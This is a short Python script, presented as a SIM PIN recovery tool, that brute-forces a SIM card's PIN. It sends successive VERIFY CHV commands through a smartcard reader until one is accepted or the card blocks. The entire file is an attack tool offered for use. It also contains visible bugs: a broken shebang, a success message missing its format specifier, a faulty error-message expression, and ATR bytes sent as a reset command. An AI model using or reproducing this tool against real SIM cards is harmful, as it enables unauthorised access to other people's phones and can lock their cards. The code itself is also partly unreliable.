#!/usr/env python3
# Author Dario Clavijo 2021
# GPLv3

import logging
import argparse
import sys
import time
import humanfriendly 

from smartcard.System import readers
#from smartcard.util import toHexString

def crack_pin(n,l,waittime=None,reset=False):
  """ The function just forms a APDU with the pin then sends it to the reader and waits for the status. """  
  ns = n
  ti = time.time()
  r=readers()
  print("[+] Reader:",r)
  connection = r[0].createConnection()
  connection.connect()

  L = 10**(l)-1
  c = True
  s = "X%dd" % l
  s = s.replace("X","%0")
  print("[+] startpin: %d, max: %d, wait: %s, reset: %s" % (n,L,str(waittime),str(reset)))

  def runtime():
    td = time.time() - ti
    nd = n - ns
    ndtd = nd/td
    htd = humanfriendly.format_timespan(td)
    print("[+] Runtime: %s, tried pins: %d, rate: %.4f" % (htd,nd,ndtd)) 

  while n <= L and c: # keep looping if the c is set
 
    N = s % n

    A = 0x30 + int(N[0])
    B = 0x30 + int(N[1])
    C = 0x30 + int(N[2])
    D = 0x30 + int(N[3])
    E = 0xFF
    F = 0xFF
    G = 0xFF
    H = 0xFF

    if l > 4:
      E = 0x30 + int(N[4])
    if l > 5:
      F = 0x30 + int(N[5])
    if l > 6:
      G = 0x30 + int(N[6])
    if l > 7:
      H = 0x30 + int(N[7])

    COMM = [0xA0, 0x20, 0x00, 0x01, 0x08, A, B, C, D, E, F, G, H] # APDU with command pkt

    try:
      data, sw1, sw2 = connection.transmit(COMM) # send the command
    except:
      print("[!] Connection error!, last pin checked: %d." % n-1)
      runtime()
      sys.exit(-1)
    scommand = str(list(map(hex,COMM)))
 
    sys.stderr.write("Pin: %s, Command: %s, Status: %02x %02x\r" % (N,scommand, sw1, sw2))
    c = (sw1 == 0x98 and sw2 == 0x08) # if invalid pin then c=True

    if sw2 == 0x40: # status for card blocked
      print("[!] Card blocked, check PUK!...")
      runtime()
      sys.exit(-1)

    if c == False: # Status for successful attack
      print("[*] The PIN is: " % N)
      runtime()
      sys.exit(0)
    n += 1

    if waittime != None: 
      time.sleep(waittime)

    if reset: # reset the chip
      RSET = [0x3B, 0x9F, 0x96, 0x80, 0x1F, 0xC6, 0x80, 0x31, 0xE0, 0x73, 0xFE, 0x21, 0x1B, 0x64, 0x41, 0x04, 0x81, 0x00, 0x82, 0x90, 0x00, 0x04]
      data, sw1, sw2 = connection.transmit(RSET)

  runtime() # prints runtime information

if __name__ == "__main__":
  parser = argparse.ArgumentParser(description="SIMM Pin recovery tool")
  parser.add_argument("--startpin", help="Pin to be cracked.")
  parser.add_argument("--lenght", help="Lenght of the Pin to be cracked.", default=4)
  parser.add_argument("--wait", help="Wait in seconds")
  parser.add_argument("--reset", help="Reset the chip after try")

  args = parser.parse_args()

  if args.startpin:
    #n= 00274710
    n = int(args.startpin)
  else:
    n = 0
  
  if args.lenght:
    if 4 <= int(args.lenght) <= 8:
      l = int(args.lenght)
    else:
      print("[!] Pin lenght shoul be between 4 and 8")
      sys.exit(-1)
  else:
    l = 4

  crack_pin(n,l,waittime=args.wait,reset=args.reset)
  print("[-] Program end.")
